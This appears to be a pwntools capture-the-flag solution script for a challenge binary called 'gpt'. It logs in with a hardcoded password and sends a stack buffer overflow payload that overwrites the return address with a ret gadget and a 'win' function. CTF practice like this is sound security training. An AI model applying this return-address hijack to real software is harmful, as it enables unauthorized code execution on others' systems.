#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './gpt'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = 'gpt1.winja.org', 38576 

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================

# creating a 'fixed' size list
password = list([None for _ in range(15)])
password[0] = 'i'
password[8] = '0'
password[5] = '3'
password[1] = '_'
password[12] = '0'
password[3] = '0'
password[4] = 'v'
password[6] = '_'
password[11] = '3'
password[13] ='0'
password[7] = 'y'
password[2] = 'l'
password[10] = '_'
password[14] = '0'
password[9] = 'u'

def exploit():
    global io
    io = initialize()
    
    io.sendlineafter(b'username:', b'tonystark')
    io.sendlineafter(b'password:', ''.join(password).encode())
    
    payload = flat({
        56: [
            0x401016,   # ret
            0x4011e9    # win
        ]
    })
    io.sendlineafter(b'User:', payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()